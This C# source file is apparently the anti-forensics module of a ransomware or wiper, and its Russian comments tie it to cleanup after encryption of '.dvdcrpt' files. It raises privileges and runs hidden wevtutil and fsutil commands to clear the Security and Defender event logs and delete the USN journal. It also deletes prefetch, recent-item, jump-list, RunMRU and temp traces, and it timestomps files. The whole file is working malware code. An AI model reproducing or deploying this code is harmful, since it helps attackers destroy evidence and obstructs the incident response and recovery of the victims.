using System;
using System.Diagnostics;
using System.IO;

namespace ns0
{
    // Анти-форензика: чистка следов работы после шифрования/вайпа.
    internal static class AntiForensics
    {
        public static void ScrubAll()
        {
            try { ClearEventLogs(); } catch { }
            try { ClearPrefetch(); } catch { }
            try { ClearRecent(); } catch { }
            try { ClearJumpLists(); } catch { }
            try { ClearRunMru(); } catch { }
            try { ClearTemp(); } catch { }
            try { ClearUsnJournal(); } catch { }
        }

        // Обнуляет USN-журнал на фиксированных томах: иначе NTFS хранит историю
        // создания/переименования/удаления файлов (включая .dvdcrpt) и пути шифрования.
        private static void ClearUsnJournal()
        {
            try
            {
                foreach (var drive in DriveInfo.GetDrives())
                {
                    try
                    {
                        if (drive.DriveType != DriveType.Fixed || !drive.IsReady) continue;
                        string root = drive.RootDirectory.FullName;
                        RunHidden("fsutil.exe", "usn deletejournal " + root);
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void ClearEventLogs()
        {
            // wevtutil cl Security не сработает без SeSecurityPrivilege/SeAuditPrivilege.
            EnablePrivilege("SeSecurityPrivilege");
            EnablePrivilege("SeAuditPrivilege");
            string[] logs = new string[]
            {
                "Application", "System", "Security", "Setup",
                "Windows PowerShell", "Microsoft-Windows-TaskScheduler/Operational",
                "Microsoft-Windows-Windows Defender/Operational"
            };
            foreach (string log in logs)
            {
                RunHidden("wevtutil.exe", "cl \"" + log + "\"");
            }
        }

        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
        private static extern bool LookupPrivilegeValue(string host, string name, out long luid);

        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool AdjustTokenPrivileges(IntPtr tokenHandle, bool disableAllPrivileges,
            ref TOKEN_PRIVILEGES newState, int bufferLength, IntPtr previousState, IntPtr returnLength);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr handle);

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        private struct LUID_AND_ATTRIBUTES
        {
            public long Luid;
            public uint Attributes;
        }

        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID_AND_ATTRIBUTES Privileges;
        }

        private const uint TOKEN_ADJUST_PRIVILEGES = 0x20;
        private const uint TOKEN_QUERY = 0x8;
        private const uint SE_PRIVILEGE_ENABLED = 0x2;

        private static void EnablePrivilege(string privilegeName)
        {
            IntPtr token = IntPtr.Zero;
            try
            {
                if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out token))
                    return;

                long luid;
                if (!LookupPrivilegeValue(null, privilegeName, out luid))
                    return;

                var tp = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Privileges = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = SE_PRIVILEGE_ENABLED }
                };
                AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            }
            catch { }
            finally
            {
                if (token != IntPtr.Zero) try { CloseHandle(token); } catch { }
            }
        }

        private static void ClearPrefetch()
        {
            try
            {
                string prefetch = Environment.ExpandEnvironmentVariables(@"%SystemRoot%\Prefetch");
                if (!Directory.Exists(prefetch)) return;
                foreach (var f in Directory.GetFiles(prefetch, "*.pf"))
                {
                    try { File.Delete(f); } catch { }
                }
            }
            catch { }
        }

        private static void ClearRecent()
        {
            try
            {
                string recent = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
                if (!Directory.Exists(recent)) return;
                foreach (var f in Directory.GetFiles(recent))
                {
                    try { File.Delete(f); } catch { }
                }
            }
            catch { }
        }

        private static void ClearJumpLists()
        {
            try
            {
                string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string autoDest = Path.Combine(appdata, @"Microsoft\Windows\Recent\AutomaticDestinations");
                string custDest = Path.Combine(appdata, @"Microsoft\Windows\Recent\CustomDestinations");
                if (Directory.Exists(autoDest))
                    foreach (var f in Directory.GetFiles(autoDest)) { try { File.Delete(f); } catch { } }
                if (Directory.Exists(custDest))
                    foreach (var f in Directory.GetFiles(custDest)) { try { File.Delete(f); } catch { } }
            }
            catch { }
        }

        private static void ClearRunMru()
        {
            try
            {
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", true))
                {
                    if (key == null) return;
                    foreach (var name in key.GetValueNames())
                    {
                        try { if (name != "MRUList") key.DeleteValue(name, false); } catch { }
                    }
                    key.SetValue("MRUList", "", Microsoft.Win32.RegistryValueKind.String);
                }
            }
            catch { }
        }

        private static void ClearTemp()
        {
            try
            {
                string temp = Path.GetTempPath();
                if (Directory.Exists(temp))
                {
                    foreach (var f in Directory.GetFiles(temp))
                    {
                        try { File.Delete(f); } catch { }
                    }
                    foreach (var d in Directory.GetDirectories(temp))
                    {
                        try { Directory.Delete(d, true); } catch { }
                    }
                }
            }
            catch { }
        }

        // Подмена времени модификации на системное (timestomp).
        public static void Timestomp(string path)
        {
            try
            {
                File.SetCreationTimeUtc(path, new DateTime(2019, 1, 1, 0, 0, 0, DateTimeKind.Utc));
                File.SetLastWriteTimeUtc(path, new DateTime(2019, 1, 1, 0, 0, 0, DateTimeKind.Utc));
                File.SetLastAccessTimeUtc(path, new DateTime(2019, 1, 1, 0, 0, 0, DateTimeKind.Utc));
            }
            catch { }
        }

        private static void RunHidden(string file, string args)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = file,
                    Arguments = args,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (var p = Process.Start(psi))
                {
                    if (p != null) p.WaitForExit(8000);
                }
            }
            catch { }
        }
    }
}